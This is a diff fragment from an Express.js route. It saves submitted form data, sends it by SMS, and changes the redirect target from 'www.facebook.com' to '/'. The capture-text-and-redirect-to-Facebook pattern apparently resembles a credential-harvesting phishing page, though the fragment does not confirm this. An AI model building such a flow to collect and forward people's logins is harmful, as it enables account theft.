@@ -60,7 +60,7 @@ _router.route('/').get((req, res)=>{
 
     await imfor.create(req.body).then(result =>{
        sendSMS(result);
-      res.status(301).redirect('www.facebook.com')
+      res.status(301).redirect('/')
     }).catch(err =>{
       console.log(err)
     });
